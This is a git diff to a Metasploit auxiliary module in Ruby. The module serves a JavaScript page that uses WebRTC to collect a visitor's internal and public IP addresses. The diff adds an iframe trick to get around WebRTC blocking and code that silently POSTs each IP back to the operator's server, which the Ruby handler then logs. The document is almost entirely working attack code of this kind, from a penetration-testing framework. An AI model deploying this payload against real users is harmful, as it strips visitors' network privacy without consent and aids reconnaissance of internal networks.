@@ -16,7 +16,8 @@ class MetasploitModule < Msf::Auxiliary
         ),
         'License'        => MSF_LICENSE,
         'Author'         => [
-          'Dhiraj Mishra',
+          'Brendan Coles', #MSF Module 
+          'Dhiraj Mishra'  #MSF Module
         ],
         'References'     => [
         ],
@@ -33,46 +34,106 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def setup
+     # code from: https://github.com/diafygi/webrtc-ips
      @html = <<-JS
-    <script>
-function userIP(onNewIP){
-var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-    var pc = new myPeerConnection({
-        iceServers: []
-    }),
-    noop = function() {},
-    localIPs = {},
-    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
-    key;
+<script>
+//get the IP addresses associated with an account
+function getIPs(callback){
+    var ip_dups = {};
 
-    function iterateIP(ip) {
-        if (!localIPs[ip]) onNewIP(ip);
-        localIPs[ip] = true;
+    //compatibility for firefox and chrome
+    var RTCPeerConnection = window.RTCPeerConnection
+        || window.mozRTCPeerConnection
+        || window.webkitRTCPeerConnection;
+    var useWebKit = !!window.webkitRTCPeerConnection;
+
+    //bypass naive webrtc blocking using an iframe
+    if(!RTCPeerConnection){
+        //NOTE: you need to have an iframe in the page right above the script tag
+        //
+        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+        //<script>...getIPs called in here...
+        //
+        var win = iframe.contentWindow;
+        RTCPeerConnection = win.RTCPeerConnection
+            || win.mozRTCPeerConnection
+            || win.webkitRTCPeerConnection;
+        useWebKit = !!win.webkitRTCPeerConnection;
     }
-pc.createDataChannel("");
-    pc.createOffer().then(function(sdp) {
-        sdp.sdp.split('\n').forEach(function(line) {
-            if (line.indexOf('candidate') < 0) return;
-            line.match(ipRegex).forEach(iterateIP);
-        });
-        pc.setLocalDescription(sdp, noop, noop);
-}).catch(function(reason) {
-});
-pc.onicecandidate = function(ice) {
-if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
-ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+
+    //minimal requirements for data connection
+    var mediaConstraints = {
+        optional: [{RtpDataChannels: true}]
     };
+
+    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
+
+    //construct a new RTCPeerConnection
+    var pc = new RTCPeerConnection(servers, mediaConstraints);
+
+    function handleCandidate(candidate){
+        //match just the IP address
+        var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+        var ip_addr = ip_regex.exec(candidate)[1];
+
+        //remove duplicates
+        if(ip_dups[ip_addr] === undefined)
+            callback(ip_addr);
+
+        ip_dups[ip_addr] = true;
+    }
+
+    //listen for candidate events
+    pc.onicecandidate = function(ice){
+
+        //skip non-candidate events
+        if(ice.candidate)
+            handleCandidate(ice.candidate.candidate);
+    };
+
+    //create a bogus data channel
+    pc.createDataChannel("");
+
+    //create an offer sdp
+    pc.createOffer(function(result){
+
+        //trigger the stun server request
+        pc.setLocalDescription(result, function(){}, function(){});
+
+    }, function(){});
+
+    //wait for a while to let everything done
+    setTimeout(function(){
+        //read candidate info from local description
+        var lines = pc.localDescription.sdp.split('\\n');
+
+        lines.forEach(function(line){
+            if(line.indexOf('a=candidate:') === 0)
+                handleCandidate(line);
+        });
+    }, 1000);
 }
 
-userIP(function(ip){
-    alert("Your Internal IP :" + ip);
+getIPs(function(ip){
+  //console.log(ip);
+  var xmlhttp = new XMLHttpRequest;
+  xmlhttp.open('POST', window.location, true);
+  xmlhttp.send(ip);
 });
 </script>
-JS
+     JS
   end
 
-  def on_request_uri(cli, _request)
-    print_status('Sending response')
-    send_response(cli, @html)
+  def on_request_uri(cli, request)
+    case request.method.downcase
+    when 'get'
+      print_status("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
+      send_response(cli, @html)
+    when 'post'
+      print_status("#{cli.peerhost}: Received reply:")
+      puts request.to_s
+    else
+      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
+    end
   end
 end
